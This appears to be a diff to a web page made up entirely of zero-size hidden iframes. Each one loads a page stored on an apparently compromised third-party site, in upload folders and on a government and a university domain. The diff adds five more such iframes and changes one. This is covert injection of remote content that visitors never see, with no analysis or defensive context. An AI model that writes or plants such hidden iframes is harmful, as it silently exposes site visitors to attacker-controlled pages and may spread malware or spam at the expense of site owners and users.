@@ -5,7 +5,7 @@
 <iframe src="https://www.skyplanners.in/main.html" width="0%" height="0"></iframe>
 <iframe src="https://skysailings.com/main.html" width="0%" height="0"></iframe>
 <iframe src="http://app.bureauveritas.com.pe/scs/homologacion/userfiles/home/css/icon.php.fla" width="0%" height="0"></iframe>
-<iframe src="https://asahankab.go.id/home/wp-content/languages/id_ID.mo.html" width="0%" height="0"></iframe>
+<iframe src="https://asahankab.go.id/" width="0%" height="0"></iframe>
 <iframe src="https://www.terabytes.com.ng/uploads/source/source/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="http://isphe.unnes.ac.id/laravel-filemanager/uploads/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="https://devicesmaintenance.com/uploads/profile/profile.html" width="0%" height="0"></iframe>
@@ -23,7 +23,11 @@
 <iframe src="http://www.studyplug.com/assets/files/profile/profile.html" width="0%" height="0"></iframe>
 <iframe src="http://www.losangelesdreamrentals.com/userfile/profile.html" width="0%" height="0"></iframe>
 <iframe src="https://www.macheene.com/public/editor/upload/users//profile/profile.html" width="0%" height="0"></iframe>
-
+<iframe src="https://gammaindonesia.org/assets/source/profil/profile.html" width="0%" height="0"></iframe>
+<iframe src="http://www.kenpaint.com/assets/source/profil/profile.htm" width="0%" height="0"></iframe>
+<iframe src="http://www.patro-tavier.be/source/profile/profile.html" width="0%" height="0"></iframe>
+<iframe src="http://www.manchieu.vn/lib/source/profile/profile.html" width="0%" height="0"></iframe>
+<iframe src="http://ocondominio.cloudpainel.com.br/source/profile/profile.html" width="0%" height="0"></iframe>
 
 
 
